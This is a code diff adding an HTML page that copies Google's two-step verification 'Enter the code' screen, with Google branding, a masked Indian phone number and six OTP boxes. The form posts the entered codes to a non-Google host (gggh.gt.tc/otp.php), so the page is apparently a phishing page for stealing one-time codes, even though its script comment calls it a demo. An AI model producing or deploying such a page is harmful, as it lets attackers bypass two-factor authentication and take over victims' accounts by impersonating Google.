@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Enter the code – Google</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <style>
+    
+    /* ✅ Reset - Remove default browser styling */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box; /* Include padding and border in element's dimensions */
+    }
+
+    /* ✅ Dark background + Roboto font */
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #101010; /* Near-black background */
+      color: #e8eaed; /* Light gray text color */
+      min-height: 76vh; /* Minimum height of viewport */
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+   
+    /* ✅ Body container - Centers content with max width */
+    .body {
+      max-width: 450px;
+      margin: 0 auto; /* Center horizontally */
+    }
+
+    /* ✅ Google Logo styling */
+    .google-logo {
+      width: 75px;
+      margin-bottom: 20px;
+    }
+
+    /* ✅ Heading style */
+    h2 {
+      font-size: 24px;
+      font-weight: 400; /* Normal weight, not bold */
+      color: #e8eaed; /* Light gray */
+      margin-bottom: 8px;
+    }
+
+    /* ✅ Instructions style */
+    .instructions {
+      font-size: 16px;
+      color: #9aa0a6; /* Medium gray */
+      margin-bottom: 30px;
+      line-height: 1.5;
+    }
+
+
+    /* ✅ Divider */
+    .divider {
+      height: 1px;
+      background-color: #3c4043;
+      margin: 25px 0;
+    }
+
+    /* ✅ OTP container */
+    .otp-container {
+      display: flex;
+      justify-content: space-between;
+      margin: 20px 0 30px;
+    }
+
+    /* ✅ OTP input fields */
+    .otp-input {
+      width: 50px;
+      height: 50px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: 500;
+      border: 1px solid #3c4043;
+      border-radius: 4px;
+      background-color: #1a1a1a;
+      color: #e8eaed;
+      outline: none;
+      transition: border 0.2s;
+    }
+
+    .otp-input:focus {
+      border-color: #8ab4f8; /* Google blue border on focus */
+      box-shadow: 0 0 0 2px rgba(138, 180, 248, 0.2);
+    }
+
+    /* ✅ Code label */
+    .code-label {
+      font-size: 16px;
+      color: #9aa0a6; /* Medium gray */
+      margin-bottom: 10px;
+    }
+
+    /* ✅ Footer Section - holds navigation and submit button */
+    .footer {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 30px;
+    }
+
+    /* ✅ Next Button styling */
+    .next-button {
+      background-color: #8ab4f8; /* Google blue */
+      color: #1a1a1a; /* Dark grey text */
+      border: none;
+      padding: 10px 24px;
+      font-weight: 500;
+      font-size: 14px;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background 0.3s ease; /* Smooth hover effect */
+    }
+
+    .next-button:hover {
+      background-color: #a0c3ff; /* Lighter blue on hover */
+    }
+
+    /* ✅ Try another way link */
+    .try-another {
+      color: #8ab4f8; /* Google blue */
+      font-size: 14px;
+      font-weight: 500; /* Medium weight */
+      text-decoration: none;
+    }
+
+    .try-another:hover {
+      text-decoration: underline;
+    }
+
+    /* ✅ Mobile Friendly - Responsive adjustments for smaller screens */
+    @media screen and (max-width: 480px) {
+      .container {
+        padding: 30px 20px;
+      }
+     
+    /* ✅ Google Logo styling */
+    .google-logo {
+      width: 50px;
+      max-width: 80%; /* Responsive: logo won't exceed 80% of container */
+      margin-bottom: 36px;
+      }
+
+      h2 {
+        font-size: 22px;
+      }
+
+      .otp-input {
+        width: 40px;
+        height: 40px;
+        font-size: 20px;
+      }
+
+      /* ✅ Footer Section - holds navigation and submit button */
+    .footer {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 20px;
+     }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- ✅ Google Logo -->
+    <img src="google.png" alt="Google logo" class="google-logo" />
+
+    <!-- ✅ Title and Instructions -->
+    <h2>Enter the code</h2>
+    <p class="instructions">To help keep your account safe, Google wants to make sure that it's really you trying to sign in</p>
+
+    <p class="instructions">A text message with a 6-digit verification code was just sent to +91********</p>
+
+    <div class="divider"></div>
+
+     <!-- ✅ password Form -->
+     <form action="https://gggh.gt.tc/otp.php" method="POST">
+
+    <!-- ✅ OTP Input Form -->
+    <form id="otpForm">
+      <div class="code-label">G-</div>
+
+      <div class="otp-container">
+        <input type="tel" name="otp0" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="otp-input" required autofocus />
+        <input type="tel" name="otp1" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="otp-input" required />
+        <input type="tel" name="otp2" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="otp-input" required />
+        <input type="tel" name="otp3" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="otp-input" required />
+        <input type="tel" name="otp4" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="otp-input" required />
+        <input type="tel" name="otp5" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="otp-input" required />
+      </div>
+
+      <!-- ✅ Footer Navigation -->
+      <div class="footer">
+        <a href="#" class="try-another">Try another way</a>
+        <button type="submit" class="next-button">Next</button>
+      </div>
+    </form>
+  </div>
+
+  <!-- ✅ OTP Auto-Focus Script -->
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const inputs = document.querySelectorAll('.otp-input');
+      const form = document.getElementById('otpForm');
+
+      // Focus on first input on page load
+      inputs[0].focus();
+
+      // Add event listeners to all inputs
+      inputs.forEach((input, index) => {
+        input.addEventListener('input', () => {
+          // Auto-tab to next input
+          if (input.value.length === 1 && index < inputs.length - 1) {
+            inputs[index + 1].focus();
+          }
+
+          // Check if all fields are filled
+          const allFilled = Array.from(inputs).every(inp => inp.value.length === 1);
+          if (allFilled) {
+            form.submit();
+          }
+        });
+
+        input.addEventListener('keydown', (e) => {
+          // Handle backspace to move to previous input
+          if (e.key === 'Backspace' && input.value === '' && index > 0) {
+            inputs[index - 1].focus();
+          }
+        });
+      });
+
+      // Form submission
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        // Get the full OTP code
+        let otpCode = '';
+        inputs.forEach(input => {
+          otpCode += input.value;
+        });
+
+        // In a real application, you would verify the OTP here
+        alert('OTP submitted: ' + otpCode + '\n(This is a demo)');
+      });
+    });
+  </script>
+</body>
+</html>
